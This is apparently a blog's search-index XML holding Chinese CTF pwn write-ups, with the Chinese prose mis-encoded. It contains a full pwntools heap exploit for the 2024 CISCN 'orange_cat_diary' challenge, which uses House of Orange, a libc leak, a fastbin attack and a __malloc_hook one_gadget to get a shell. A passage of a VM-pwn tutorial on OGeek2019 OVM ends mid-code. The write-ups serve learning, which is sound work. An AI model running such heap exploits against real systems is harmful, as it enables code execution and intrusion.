<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2024ciscn-PWNå¤ç°</title>
      <link href="/2025/03/07/2024ciscn-PWN%E5%A4%8D%E7%8E%B0/"/>
      <url>/2025/03/07/2024ciscn-PWN%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="orange-cat-diary"><a href="#orange-cat-diary" class="headerlink" title="orange_cat_diary"></a>orange_cat_diary</h1><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>ä¸»ä»£ç é€»è¾‘è¿˜æ˜¯ä¸€æ ·çš„èœå•å †ï¼Œè€Œä¸”åªæ˜¯Glibc2.23çš„å †é¢˜ç›®ï¼Œä¿æŠ¤å…¨å¼€ï¼Œä¸‹é¢æ¥çœ‹çœ‹å„ä¸ªéƒ¨åˆ†çš„å®ç°ï¼š</p><ul><li>add</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input the length of the diary content:&quot;</span>);</span><br><span class="line">  v1 = input();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)v1 &gt; <span class="number">0x1000</span> ) <span class="comment">// sizeç»™çš„å¾ˆå¤§</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The diary content exceeds the maximum length allowed.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ptr = <span class="built_in">malloc</span>(v1); <span class="comment">// å¹¶ä¸æ˜¯ç”¨çš„æ•°ç»„æ¥å‚¨å­˜å †ï¼Œåªèƒ½æ§åˆ¶å½“å‰çš„chunk</span></span><br><span class="line">  <span class="keyword">if</span> ( !ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Memory allocation failed.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  dword_202058 = v1; </span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please enter the diary content:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, ptr, dword_202058);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Diary addition successful.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>delete</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_D83</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( dword_202010 &gt; <span class="number">0</span> ) <span class="comment">// è¯¥æ•°æ®=1ï¼Œå³æˆ‘ä»¬åªèƒ½åˆ©ç”¨ä¸€æ¬¡free</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptr); <span class="comment">// æŒ‡é’ˆæ²¡æ¸…é›¶ï¼Œæœ‰uaf</span></span><br><span class="line">    --dword_202010;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Diary deletion successful.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>show</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_DE9</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( dword_202014 &gt; <span class="number">0</span> ) <span class="comment">// åŒç†ï¼Œåªæœ‰ä¸€æ¬¡show</span></span><br><span class="line">  &#123;</span><br><span class="line">    fwrite(ptr, <span class="number">1uLL</span>, dword_202058, <span class="built_in">stdout</span>);</span><br><span class="line">    --dword_202014;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Diary view successful.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>edit</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input the length of the diary content:&quot;</span>);</span><br><span class="line">  v1 = input();</span><br><span class="line">  <span class="keyword">if</span> ( dword_202058 + <span class="number">8</span> &lt; (<span class="type">unsigned</span> <span class="type">int</span>)v1 ) <span class="comment">// å…è®¸ä¿®æ”¹æº¢å‡º8å­—èŠ‚</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The diary content exceeds the maximum length allowed.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please enter the diary content:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, ptr, v1);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Diary modification successful.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>ä¸‹é¢æ¥ç®€å•åˆ†æä¸€ä¸‹æ¼æ´åœ¨å“ª</li></ul><ol><li><p>é¦–å…ˆåœ¨<code>delete</code>é‡Œé¢æœ‰ä¸€ä¸ªuafï¼Œ<code>edit</code>é‡Œé¢å¯ä»¥æº¢å‡ºä¿®æ”¹ï¼Œ<code>show</code>å¯ä»¥æ³„éœ²libcï¼Œä½†æ˜¯deleteå’Œshowéƒ½åªæœ‰ä¸€æ¬¡æœºä¼šï¼ŒæŒ‰ç…§å¸¸è§„çš„æ“ä½œï¼Œmalloc(0x80)ï¼Œç„¶åfree-&gt;showï¼Œè·å¾—libcçš„åœ°å€ï¼Œä½†è¿™æ ·æˆ‘ä»¬åé¢å°±æ— æ³•ç»§ç»­æ“ä½œäº†ã€‚</p></li><li><p>åƒè¿™æ ·çš„æœ‰uafä¸”ä¿æŠ¤å…¨å¼€ï¼Œæˆ‘ä»¬å¯ä»¥æ‰“ <code>fastbin Arbitrary</code>ï¼Œé”™ä½æ„é€  <code>mallo_hook</code>ä¹‹ä¸Š0x23çš„åœ°æ–¹ä¸ºfake_chunkï¼Œç„¶åæ”¹malloc_hookï¼Œä½†æ˜¯è¿™é‡Œéœ€è¦ç”¨åˆ°ä¸€æ¬¡freeï¼Œä½†æ˜¯freeå·²ç»ç”¨æ‰äº†ï¼Œæ²¡æœºä¼šäº†ï¼Œæ‰€ä»¥æ³„éœ²libcçš„æ–¹å¼è¦æ”¹ä¸€æ”¹ï¼Œä¸èƒ½ç”¨freeã€‚</p></li></ol><blockquote><p>arbitraryæ–‡ç« å¯çœ‹ï¼š<a href="http://downbeat.top/2024/09/03/0ctf-2017-babyheap-fastbin-attack/">http://downbeat.top/2024/09/03/0ctf-2017-babyheap-fastbin-attack/</a></p></blockquote><ol start="3"><li>ä¸ç”¨freeï¼Œä½†å…¶å®æˆ‘ä»¬å¯ä»¥ç”¨ <code>House of orange</code>é‡Œé¢çš„ä¸€ç‚¹çŸ¥è¯†</li></ol><p>editå…è®¸æˆ‘ä»¬æº¢å‡ºä¿®æ”¹0x8å­—èŠ‚çš„æ•°æ®ï¼Œè‹¥æ˜¯malloc(0xn8)ï¼Œæˆ‘ä»¬å¯ä»¥æº¢å‡ºä¿®æ”¹ topchunkçš„sizeï¼Œå°†æ”¹sizeæ”¹ä¸ºæ¯”0x1000å°çš„æ•°å­—ï¼Œç„¶åå†æ¬¡malloc(0x1000)ï¼Œæ­¤æ—¶ä¼šæ›´æ–°topchunkï¼Œæ—§çš„topchunkä¼šè¿›å…¥unsortedbinä¸­ï¼Œå…¶fdæŒ‡é’ˆæ˜¯æŒ‡å‘ <code>main_arena-88</code>çš„åœ°å€ï¼Œå†æ¬¡mallocåˆ‡åˆ†unsortedbinï¼Œæ­¤æ—¶çš„chunkçš„fdæŒ‡é’ˆå°†æ˜¯ä¸€ä¸ªä¸libcçš„åŸºåœ°å€æœ‰ç€å›ºå®šåç§»çš„åœ°å€ï¼Œå› æ­¤æˆ‘ä»¬ä¹Ÿå°±ä¸ç”¨free å°±è·å¾—äº†libcçš„åœ°å€ã€‚ç„¶åæ­£å¸¸æ‰“ <code>Arbitrary alloc</code>å³å¯ã€‚</p><p>ä½†æ˜¯topchunkæœ‰ä¸€ä¸ªæ£€æŸ¥:</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) || ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse (old_top) &amp;&amp; ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>)</span><br></pre></td></tr></table></figure></div><p>ç®€å•æ¥è¯´ï¼Œtop chunkçš„sizeè¦å¤§äºç­‰äºMINSIZE,top chunkçš„ç»“æŸåœ°å€å¿…é¡»æ˜¯<strong>é¡µå¯¹å…¶</strong>çš„ï¼Œtop chunkç›¸é‚»çš„å‰ä¸€ä¸ªchunkå¿…é¡»å¤„äºinuseçŠ¶æ€ã€‚</p><p><mark>ä¿®æ”¹topchunkçš„sizeçš„æ—¶å€™è¦ä¿è¯æœ«ä¸‰å­—èŠ‚ç›¸åŒ(é¡µå¯¹å…¶)<mark></mark></mark></p><h2 id="è°ƒè¯•åˆ†æ"><a href="#è°ƒè¯•åˆ†æ" class="headerlink" title="è°ƒè¯•åˆ†æ"></a>è°ƒè¯•åˆ†æ</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x18</span>) + p64(<span class="number">0xfe1</span>) </span><br><span class="line">edit(<span class="number">0x20</span>,payload)</span><br><span class="line">bug()</span><br><span class="line">add(<span class="number">0x1000</span>) <span class="comment"># æ—§çš„topchunkè¿›å…¥unsortedbin</span></span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment"># åˆ†ç¦»unsortedbin</span></span><br><span class="line">show()</span><br><span class="line">libc.address = l64() - <span class="number">0x3c5161</span></span><br><span class="line">lg(<span class="string">&quot;libc_address: &quot;</span>,libc.address)</span><br></pre></td></tr></table></figure></div><ul><li>å¦‚ä¸‹ï¼Œæ—§çš„topchunkè¿›å…¥äº†unsortedbinä¸­</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../image-20250307165506244.png" alt="image-20250307165506244"></p><ul><li>å†æ¬¡mallocï¼Œè¯¥chunkä¸libcçš„åŸºåœ°å€æœ‰ä¸ªå›ºå®šçš„åç§»</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../image-20250307170017160.png" alt="image-20250307170017160"></p><p><img lazyload src="/images/loading.svg" data-src="/../image-20250307170052998.png" alt="image-20250307170052998"></p><ul><li>ç„¶åå°±æ˜¯æ­£å¸¸çš„ Arbitraty allocæ‰“æ³•äº†ï¼Œå°±ä¸åˆ†æäº†ï¼Œå°†malloc_hookæ”¹ä¸ºoggå³å¯</li></ul><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line">    <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ia</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rc   = <span class="keyword">lambda</span> num=<span class="number">4096</span>   :p.recv(num)</span><br><span class="line">ru  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">rl  = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg= <span class="keyword">lambda</span> s, num   :p.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&quot;amd64&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span></span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>] <span class="comment"># wsl</span></span><br><span class="line">file = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc = <span class="string">&quot;./libc-2.23.so&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = process(file)</span><br><span class="line">elf = ELF(file)</span><br><span class="line">libc = ELF(libc)</span><br><span class="line"><span class="comment">#p = remote(&quot;pwn.challenge.ctf.show&quot;,)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&quot;choice:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content=<span class="string">&#x27;a&#x27;</span></span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;content:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    choice(<span class="number">2</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">size,content</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;content:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;name.&quot;</span>,<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line"><span class="comment"># showå’Œfreeéƒ½åªèƒ½ç”¨ä¸€æ¬¡</span></span><br><span class="line"><span class="comment"># ä¿®æ”¹topchunkçš„sizeï¼Œç„¶åmallocä¸€ä¸ªå¤§äºè¯¥sizeçš„chunk</span></span><br><span class="line"><span class="comment"># æ—§çš„topchunkä¼šè¿›å…¥unsortedbinä¸­ï¼Œç„¶åshowå°±å¾—åˆ°libcçš„åœ°å€</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x18</span>) + p64(<span class="number">0xfe1</span>) </span><br><span class="line">edit(<span class="number">0x20</span>,payload)</span><br><span class="line">bug()</span><br><span class="line">add(<span class="number">0x1000</span>) <span class="comment"># æ—§çš„topchunkè¿›å…¥unsortedbin</span></span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment"># åˆ†ç¦»unsortedbin</span></span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">libc.address = l64() - <span class="number">0x3c5161</span></span><br><span class="line">lg(<span class="string">&quot;libc_address: &quot;</span>,libc.address)</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x4527a</span> , <span class="number">0xf03a4</span> , <span class="number">0xf1247</span>]</span><br><span class="line">malloc_hook = libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰“fastbin arbitrary</span></span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">free()</span><br><span class="line">edit(<span class="number">0x70</span>,p64(malloc_hook - <span class="number">0x23</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>, cyclic(<span class="number">0x13</span>) + p64(one[<span class="number">1</span>] + libc.address)) <span class="comment"># fake_chunk</span></span><br><span class="line"></span><br><span class="line">choice(<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">&quot;content:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 2024ciscn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VMpwnå…¥é—¨</title>
      <link href="/2025/03/05/VMpwn%E5%85%A5%E9%97%A8/"/>
      <url>/2025/03/05/VMpwn%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ç”±äºåœ¨ <code>2025GHCTF</code>æ–°ç”Ÿèµ›ä¸Šçœ‹åˆ°äº† <code>VMpwn</code>ï¼Œæ‰€ä»¥æ‰“ç®—æµ…æµ…å…¥ä¸ªé—¨ï¼Œå‚è€ƒä¸€ä¸‹å‡ºé¢˜äººçš„æ–‡ç« å§ï¼Œå†™çš„æŒºè¯¦ç»†çš„ã€‚</p><p>ğŸ˜˜ğŸ˜˜<a class="link" href="https://iyheart.github.io/2025/02/22/CTFblog/PWN%E7%B3%BB%E5%88%97blog/VM_pwn/vm-pwn%E5%85%A5%E9%97%A8/">æ–‡ç« é“¾æ¥ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="VMpwnçš„ä»‹ç»"><a href="#VMpwnçš„ä»‹ç»" class="headerlink" title="VMpwnçš„ä»‹ç»"></a>VMpwnçš„ä»‹ç»</h2><p>VMpwnå¯ä»¥ç†è§£ä¸ºè®©æˆ‘ä»¬è‡ªå·±å»è¾“å…¥opcodeï¼Œç„¶åç¨‹åºä¼šè¯»å–å¯¹åº”çš„opcodeæ¥æ‰§è¡Œå¯¹åº”çš„æ“ä½œï¼Œå¸¸è§çš„æœ‰</p><ol><li>æ¨¡æ‹Ÿå¯„å­˜å™¨æ“ä½œï¼Œæ¯”å¦‚è¯´å¯„å­˜å™¨åŠ å‡ä¹˜é™¤ï¼Œå¼‚æˆ–ç­‰ã€‚</li><li>æ¨¡æ‹Ÿstackï¼Œå…¥æ ˆå‡ºæ ˆ</li><li>æ¨¡æ‹Ÿdataæ®µ</li><li>æ¨¡æ‹Ÿtextæ®µ</li></ol><p>é™¤äº†ä¸Šè¿°è¿˜æœ‰è›®å¤šï¼Œæš‚ä¸”ä¸è¯´äº†ï¼Œä½†åŸºæœ¬çš„æ•°æ®éƒ½æ˜¯ä½äº <code>bssæ®µ</code>ä¸Šçš„ã€‚</p><p>ä¹Ÿæ­£æ˜¯å› ä¸ºæ•°æ®åŸºæœ¬éƒ½åœ¨bssæ®µä¸Šï¼Œæ‰€ä»¥å¸¸è§çš„æ¼æ´å°±æ˜¯è¿›è¡Œæº¢å‡ºæ”¹å†™ï¼Œé€šå¸¸ä¸ä¼šå¯¹æ¨¡æ‹Ÿçš„æ•°æ®æ•°ç»„è¿›è¡Œä¸‹æ ‡æ£€æŸ¥ã€‚</p><p>è¿˜æœ‰è¦åŸºæœ¬ç†è§£çš„åœ°æ–¹ï¼Œå€Ÿç”¨å‡ºé¢˜äººçš„å›¾ç‰‡ï¼š</p><p><img lazyload src="/images/loading.svg" data-src="/../gift-1741178155631-1.png" alt="gift"></p><h1 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h1><p>å»ºè®®å…ˆçœ‹ç¬¬äºŒä¸ªä¾‹é¢˜ï¼š2025GHCTF</p><h2 id="OGeek2019-Final-OVM"><a href="#OGeek2019-Final-OVM" class="headerlink" title="OGeek2019 Final OVM"></a>OGeek2019 Final OVM</h2><p>å‚è€ƒï¼š<a class="link" href="https://x1ng.top/2020/12/17/%E5%AD%A6%E4%B9%A0VM-PWN/">https://x1ng.top/2020/12/17/%E5%AD%A6%E4%B9%A0VM-PWN/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>é¢˜ç›®é“¾æ¥ï¼š<a class="link" href="https://buuoj.cn/challenges#[OGeek2019%20Final]OVM">click_me <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">comment = <span class="built_in">malloc</span>(<span class="number">0x8C</span>uLL);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  signal(<span class="number">2</span>, signal_handler);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;WELCOME TO OVM PWN\n&quot;</span>, <span class="number">0x16</span>uLL);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;PC: &quot;</span>, <span class="number">4uLL</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%hd&quot;</span>, &amp;pc_);</span><br><span class="line">  getchar();</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;SP: &quot;</span>, <span class="number">4uLL</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%hd&quot;</span>, &amp;sp_);</span><br><span class="line">  getchar();</span><br><span class="line">  reg[<span class="number">13</span>] = sp_;</span><br><span class="line">  reg[<span class="number">15</span>] = pc_;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;CODE SIZE: &quot;</span>, <span 